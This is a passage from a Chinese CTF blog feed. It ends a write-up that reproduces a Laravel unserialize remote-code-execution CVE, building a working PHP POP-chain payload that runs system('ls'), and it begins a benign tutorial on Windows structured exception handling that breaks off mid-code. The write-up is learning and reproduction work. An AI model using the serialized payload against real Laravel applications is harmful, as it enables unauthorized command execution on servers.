class_">namespace</span> <span class="hljs-title class_">Faker</span>&#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">DefaultGenerator</span>&#123;<br>        <span class="hljs-title class_">protected</span> $<span class="hljs-title class_">default</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">default</span> = [<span class="hljs-string">&#x27;1&#x27;</span>];<span class="hljs-comment">//这里用数组是因为原调用出会有一个foreach遍历</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> &#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">Illuminate</span>\<span class="hljs-title class_">Foundation</span>\<span class="hljs-title class_">Testing</span>\<span class="hljs-title class_">PendingCommand</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PendingCommand</span>(<span class="hljs-string">&#x27;system&#x27;</span>,[<span class="hljs-string">&#x27;ls&#x27;</span>])));<br>&#125;<br><br></code></pre></td></tr></table></figure><p>但是继续报错</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202310072020182.png"></p><p>提示<code>Target [Illuminate\Contracts\Console\Kernel] is not instantiable</code>,也就是说<code>[Illuminate\Contracts\Console\Kernel]</code>这个东西对应的类无法被实例化。</p><p>那么我们单步调试看看</p><p>最终在<code>Illuminate\Container\Container.php</code>的<code>if ($this-&gt;isBuildable($concrete, $abstract))</code>方法报错</p><p>相关代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-variable">$concrete</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getConcrete</span>(<span class="hljs-variable">$abstract</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">isBuildable</span>(<span class="hljs-variable">$concrete</span>, <span class="hljs-variable">$abstract</span>)) &#123;<br>  <span class="hljs-variable">$object</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">build</span>(<span class="hljs-variable">$concrete</span>);<br>&#125; <br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$object</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">make</span>(<span class="hljs-variable">$concrete</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这里的<code>$abstract</code>就是<code>Illuminate\Contracts\Console\Kernel</code>这个字符串，也就是最前面的<code>Kernel::class</code>所对应的字符串</p><p>来看看这几个方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getConcrete</span>(<span class="hljs-params"><span class="hljs-variable">$abstract</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (! <span class="hljs-title function_ invoke__">is_null</span>(<span class="hljs-variable">$concrete</span> = <span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">getContextualConcrete</span>(<span class="hljs-variable">$abstract</span>))) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$concrete</span>;<br>    &#125;<br>    <span class="hljs-comment">// If we don&#x27;t have a registered resolver or concrete for the type, we&#x27;ll just</span><br>    <span class="hljs-comment">// assume each type is a concrete name and will attempt to resolve it as is</span><br>    <span class="hljs-comment">// since the container should be able to resolve concretes automatically.</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;bindings[<span class="hljs-variable">$abstract</span>])) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;bindings[<span class="hljs-variable">$abstract</span>][<span class="hljs-string">&#x27;concrete&#x27;</span>];<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$abstract</span>;<br>&#125;<br><br><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isBuildable</span>(<span class="hljs-params"><span class="hljs-variable">$concrete</span>, <span class="hljs-variable">$abstract</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$concrete</span> === <span class="hljs-variable">$abstract</span> || <span class="hljs-variable">$concrete</span> <span class="hljs-keyword">instanceof</span> <span class="hljs-built_in">Closure</span>;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">build</span>(<span class="hljs-params"><span class="hljs-variable">$concrete</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$concrete</span> <span class="hljs-keyword">instanceof</span> <span class="hljs-built_in">Closure</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$concrete</span>(<span class="hljs-variable language_">$this</span>, <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getLastParameterOverride</span>());<br>    &#125;<br><br>    <span class="hljs-variable">$reflector</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReflectionClass</span>(<span class="hljs-variable">$concrete</span>);<br><br>    <span class="hljs-keyword">if</span> (! <span class="hljs-variable">$reflector</span>-&gt;<span class="hljs-title function_ invoke__">isInstantiable</span>()) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">notInstantiable</span>(<span class="hljs-variable">$concrete</span>);<br>    &#125;<br><br>    <span class="hljs-variable language_">$this</span>-&gt;buildStack[] = <span class="hljs-variable">$concrete</span>;<br><br>    <span class="hljs-variable">$constructor</span> = <span class="hljs-variable">$reflector</span>-&gt;<span class="hljs-title function_ invoke__">getConstructor</span>();<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_null</span>(<span class="hljs-variable">$constructor</span>)) &#123;<br>        <span class="hljs-title function_ invoke__">array_pop</span>(<span class="hljs-variable">$this</span>-&gt;buildStack);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-variable">$concrete</span>;<br>    &#125;<br><br>    <span class="hljs-variable">$dependencies</span> = <span class="hljs-variable">$constructor</span>-&gt;<span class="hljs-title function_ invoke__">getParameters</span>();<br>    <span class="hljs-variable">$instances</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">resolveDependencies</span>(<br>        <span class="hljs-variable">$dependencies</span><br>    );<br><br>    <span class="hljs-title function_ invoke__">array_pop</span>(<span class="hljs-variable">$this</span>-&gt;buildStack);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$reflector</span>-&gt;<span class="hljs-title function_ invoke__">newInstanceArgs</span>(<span class="hljs-variable">$instances</span>);<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>到这里其实就已经了然了。</p><p>字符串<code>Illuminate\Contracts\Console\Kernel</code>作为<code>$this-&gt;bindings</code>的键值，去取另一个数组，并从另一个数组中以键值<code>concrete</code>取出一个对象，否则就返回<code>Illuminate\Contracts\Console\Kernel</code>，然后去<code>build</code>一个对象，但是我们之前给<code>app</code>传入的对象显然不能实例化，因为我们之前没有对<code>bindings</code>赋值，传进去的<code>concrete</code>是字符串<code>Illuminate\Contracts\Console\Kernel</code></p><p>所以我们就得为<code>app</code>的值构造一下。</p><p>先来看看我们需要什么，我们需要<code>app</code>是一个二维数组，[<code>Illuminate\Contracts\Console\Kernel</code>] &#x3D;&gt; [<code>concrete</code> &#x3D;&gt; 一个可以实例化的类]，并且这个类还得有call方法，因为最终返回的就是一个该类的实例化对象，然后调用这个对象的<code>call</code>方法</p><p>最后发现就是</p><p><code>Illuminate\Container</code>下的<code>Container</code>类好用，不仅有<code>bindings</code>属性，还有<code>call</code>方法</p><p>于是再修改payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">Illuminate</span>\<span class="hljs-title class_">Foundation</span>\<span class="hljs-title class_">Testing</span>&#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">Faker</span>\<span class="hljs-title class_">DefaultGenerator</span>;<br>    <span class="hljs-keyword">use</span>  <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Container</span>\<span class="hljs-title">Container</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PendingCommand</span></span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$app</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$command</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$parameters</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$command</span>,<span class="hljs-variable">$parameters</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;command = <span class="hljs-variable">$command</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;parameters = <span class="hljs-variable">$parameters</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;test = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultGenerator</span>();<br>            <span class="hljs-variable language_">$this</span>-&gt;app = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Container</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">Faker</span>&#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">DefaultGenerator</span>&#123;<br>        <span class="hljs-title class_">protected</span> $<span class="hljs-title class_">default</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">default</span> = [<span class="hljs-string">&#x27;1&#x27;</span>];<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">Illuminate</span>\<span class="hljs-title class_">Container</span>&#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">Container</span>&#123;<br>        <span class="hljs-title class_">protected</span> $<span class="hljs-title class_">bindings</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;bindings = [<span class="hljs-string">&#x27;Illuminate\Contracts\Console\Kernel&#x27;</span> =&gt; [<span class="hljs-string">&#x27;concrete&#x27;</span> =&gt; <span class="hljs-string">&#x27;Illuminate\Container\\Container&#x27;</span>]];<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> &#123;<br><br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">Illuminate</span>\<span class="hljs-title class_">Foundation</span>\<span class="hljs-title class_">Testing</span>\<span class="hljs-title class_">PendingCommand</span>;<br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PendingCommand</span>(<span class="hljs-string">&#x27;system&#x27;</span>,[<span class="hljs-string">&#x27;ls&#x27;</span>])));<br>&#125;<br><br></code></pre></td></tr></table></figure><p>然后就可以成功打通</p><h2 id="2-后记"><a href="#2-后记" class="headerlink" title="2.后记"></a>2.后记</h2><p>1.判断哪里有问题就看程序在哪里crush掉，也就是类似于进入<code>catch</code>块</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable">$passable</span></span>) <span class="hljs-keyword">use</span> (<span class="hljs-params"><span class="hljs-variable">$destination</span></span>) </span>&#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$destination</span>(<span class="hljs-variable">$passable</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">handleException</span>(<span class="hljs-variable">$passable</span>, <span class="hljs-variable">$e</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Throwable</span> <span class="hljs-variable">$e</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">handleException</span>(<span class="hljs-variable">$passable</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">FatalThrowableError</span>(<span class="hljs-variable">$e</span>));<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>2.动态调试还是比较重要的，不需要理解每一步具体是在干什么，但通过注释，变量名字大体都可以猜到是在干什么</p><p>3.一步一步复现成功，还是很开心哒！</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Web</category>
      
      <category>unserialize</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>unserialize</tag>
      
      <tag>cve</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SEH笔记</title>
    <link href="/2023/08/23/SEH/"/>
    <url>/2023/08/23/SEH/</url>
    
    <content type="html"><![CDATA[<p>浅谈SEH</p><span id="more"></span><p>​从去年的moectf到今年的moectf，以及平日的刷题都遇到了SEH的题目，但是一直没有系统的学习总结。正巧最近也在看《加密与解密》这本书，也看到了SEH相关内容。就借着今年的moectf来总结一下SEH吧！</p><h1 id="SEH"><a href="#SEH" class="headerlink" title="SEH"></a>SEH</h1><h2 id="什么是SEH"><a href="#什么是SEH" class="headerlink" title="什么是SEH"></a>什么是SEH</h2><p>​SEH全称Structured Exception Handling，即结构化处理异常。是一种当代码产生异常提供纠错机会的机制，比如访问非法地址，发生除0错误就去修正地址、修正除数等。换句话说，也就是发生异常的时候系统会调用一个用户自定义的回调函数，此回调函数的主要作用就是修正错误，让代码重新正常运行。</p><p>不妨先看看这个回调函数样子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">EXCEPTION_DISPOSITION<br>__cdecl _except_handler( <span class="hljs-keyword">struct</span> _EXCEPTION_RECORD *ExceptionRecord,<br>                        <span class="hljs-type">void</span> * EstablisherFrame,<br>                        <span class="hljs-keyword">struct</span> _CONTEXT *ContextRecord,<br>                        <span class="hljs-type">void</span> * DispatcherContext);<br></code></pre></td></tr></table></figure><p>​这个函数就是在发生异常的时候操作系统会调用的异常处理函数，它有四个参数，指示了一些与异常相关的信息。可能会有疑问，即我怎么这四个参数的值是多少呢？其实在异常发生的时候，操作系统就会自动把这个四个参数压入栈中，也因此需要<code>__cdecl</code>来声明此函数的调用约定。</p><p>它的返回值是枚举类型</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">typedef enum _EXCEPTION_DISPOSITION<br>&#123;<br>    ExceptionContinueExecution = <span class="hljs-number">0</span>, <span class="hljs-regexp">//</span>已经处理了异常，回到异常触发点继续执行<br>    ExceptionContinueSearch = <span class="hljs-number">1</span>,    <span class="hljs-regexp">//</span>没有处理异常，继续遍历异常链表<br>    ExceptionNestedException = <span class="hljs-number">2</span>,   <span class="hljs-regexp">//</span>OS内部使用<br>    ExceptionCollidedUnwind = <span class="hljs-number">3</span>     <span class="hljs-regexp">//</span>OS内部使用<br>&#125;EXCEPTION_DISPOSITION;<br></code></pre></td></tr></table></figure><p>现在就来看看这四个参数是什么</p><pre><code class="hljs">     函数的第一个参数是一个指向**EXCEPTION_RECORD**结构的指针，定义如下</code></pre><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">EXCEPTION_RECORD</span> &#123;</span><br>   DWORD ExceptionCode; <span class="hljs-comment">//异常代码 比如0xc0000005</span><br>   DWORD ExceptionFlags; <span class="hljs-comment">//异常标志</span><br>   <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">EXCEPTION_RECORD</span> *<span class="hljs-title">ExceptionRecord</span>;</span> <span class="hljs-comment">//指向另一个此结构的指针</span><br>   PVOID ExceptionAddress; <span class="hljs-comment">//异常发生地址</span><br>   DWORD NumberParameters; <span class="hljs-comment">//下面数组的元素个数</span><br>   DWORD ExceptionInformation[EXCEPTION_MAXIMUM_PARAMETERS]; <span class="hljs-comment">//附加信息</span><br>&#125; EXCEPTION_RECORD;<br></code></pre></td></tr></table></figure><p>​函数的第二个参数是一个指向establisher帧结构的指针。它是SEH中一个至关重要的参数，但是现在可以忽略它</p><p>​回调函数的第三个参数是一个指向<strong>CONTEXT</strong>结构的指针，定义如下（该结构定义随着Windows系统不同也会改变。此结构保存异常发生时一些上下文环境</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">CONTEXT</span></span><br><span class="hljs-class">&#123;</span><br>    DWORD ContextFlags;<br>    DWORD Dr0;<br>    DWORD Dr1;<br>    DWORD Dr2;<br>    DWORD Dr3;<br>    DWORD Dr6;<br>    DWORD Dr7;<br>    FLOATING_SAVE_AREA FloatSave;<br>    DWORD SegGs;<br>    DWORD SegFs;<br>    DWORD SegEs;<br>    DWORD SegDs;<br>    DWORD Edi;<br>    DWORD Esi;<br>    DWORD Ebx;<br>    DWORD Edx;<br>    DWORD Ecx;<br>    DWORD Eax;<br>    DWORD Ebp;<br>    DWORD Eip;<br>    DWORD SegCs;<br>    DWORD EFlags;<br>    DWORD Esp;<br>    DWORD SegSs;<br>&#125; CONTEXT;<br></code></pre></td></tr></table></figure><p>回调函数的第四个参数被称为DispatcherContext。它暂时也可以被忽略。</p><p>​现在我们大概知道回调函数会有四个参数，这些参数会由操作系统自动压栈，并且这些参数还会为我们提供异常的重要信息，现在还有一个问题就是，操作系统去哪里找这个回调函数？</p><p>​首先我们应该想到一个问题，即异常处理函数不可能只有一个，毕竟有那么多不同的异常，每个异常都需要专门的函数去处理，因此操作系统选择把这些异常处理函数以链表的形式存储，也就是<strong>EXCEPTION_REGISTRATION_RECORD</strong>结构，此结构定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">EXCEPTION_REGISTRATION_RECORD</span>&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">EXCEPTION_REGISTRATION_RECORD</span> *<span class="hljs-title">Next</span>;</span> <span class="hljs-comment">//指向下一个结构的指针</span><br>PEXCEPTION_ROUTINE Handler; <span class="hljs-comment">//当前异常处理函数的地址</span><br>&#125;EXCEPTION_REGISTRATION_RECORD;<br></code></pre></td></tr></table></figure><p>因此只要找到这个<strong>EXCEPTION_REGISTRATION_RECORD</strong>结构，就可以找到异常处理函数，那么这个结构在哪呢？</p><p>​这就不得不提到TIB（Thread Information Block，线程信息块）了，它位于TEB（Thread Environment Block，线程环境块）的头部。TEB是操作系统为了保存每个线程的私有数据而创建的，也就是说每个线程都有自己独立的TEB。不同系统的TIB结构也会不同，但我们也不需要具体知道TIB结构，因为**_EXCEPTION_REGISTRATION_RECORD**结构总位于TIB结构头部。而在32位系统上，<code>fs:[0]</code>总是指向TIB结构。</p><p>一句话说明，我们只需要去<code>fs:[0]</code>就可以找到此链表了。</p><p>下面就来试试SEH吧！</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br>DWORD scratch;<br>EXCEPTION_DISPOSITION<br>__cdecl<br>_except_handler(<span class="hljs-keyword">struct</span> _EXCEPTION_RECORD* ExceptionRecord,<br>    <span class="hljs-type">void</span>* EstablisherFrame,<br>    <span class="hljs-keyword">struct</span> _CONTEXT* ContextRecord,<br>    <span class="hljs-type">void</span>* DispatcherContext)<br>&#123;<br>    <span class="hljs-type">unsigned</span> i;<br>    <span class="hljs-comment">// 指明是我们让流程转到我们的异常处理程序的</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello from an exception handler\n&quot;</span>);<br>    <span class="hljs-comment">// 改变CONTEXT结构中EAX的值，以便它指向可以成功进写操作的位置</span><br>    ContextRecord-&gt;Eax = (DWORD)&amp;scratch;<br>    <span class="hljs-comment">// 告诉操作系统重新执行出错的指令</span><br>    <span class="hljs-keyword">return</span> ExceptionContinueExecution;<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    DWORD handler = (DWORD)_except_handler;<span class="hljs-comment">//当然也可以把这个异常处理函数任意命名</span><br>    <span class="hljs-comment">//安装我们自己的SEH</span><br>    __asm<br>    &#123;<br>        <span class="hljs-comment">// 创建EXCEPTION_REGISTRATION结构：</span><br>        <span class="hljs-comment">// 注意压栈顺序，请细细体会这个链表的形成过程</span><br>        push handler <span class="hljs-comment">// handler函数的地址</span><br>        push FS : [<span class="hljs-number">0</span>] <span class="hljs-comment">// 前一个handler函数的地址</span><br>        mov FS : [<span class="hljs-number">0</span>] , ESP <span class="hljs-comment">// 安装新的EXECEPTION_REGISTRATION结构</span><br>    &#125;<br>    __asm<br>    &#123;<br>        mov eax, <span class="hljs-number">0</span>     <span class="hljs-comment">// 将EAX清零</span><br>        mov[eax], <span class="hljs-number">1</span> <span class="hljs-comment">// 写EAX指向的内存从而故意引发一个错误</span><br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;After writing!\n&quot;</span>);<br>    <br>    <span class="hljs-comment">//卸载我们自己的SEH</span><br>    __asm<br>    &#123;<br>        <span class="hljs-comment">// 移去我们的EXECEPTION_REGISTRATION结构</span><br>        mov eax, [ESP]    <span class="hljs-comment">// 获取前一个结构</span><br>        mov FS : [<span class="hljs-number">0</span>] , EAX <span class="hljs-comment">// 安装前一个结构</span><br>        add esp, <span class="hljs-number">8</span>       <span class="hljs-comment">// 将我们的EXECEPTION_REGISTRATION弹出堆栈</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里使用了几句简单的汇编语言，以便和之前所说的对应。实际上<code>__try</code>操作也是类似的，编译器也会大概如此翻译。</p><p>再次总结一下目前已经知道的东西：在异常发生时，操作系统会去<code>fs:[0]</code>找**_EXCEPTION_REGISTRATION_RECORD**结构，此结构是异常处理函数的链表，即<code>fs:[0]</code>存放的是下一个异常处理函数结构的地址，<code>fs:[4]</code>存放的就是当前异常处理函数地址。此链表也就是所谓的SEH链，操作需要此SEH链来遍历所有异常处理函数，来找到可以处理此异常的函数。</p><h2 id="初探展开"><a href="#初探展开" class="headerlink" title="初探展开"></a>初探展开</h2><p>如下是第二段demo，此demo中我们选择不处理异常，看看会发生什么吧！</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 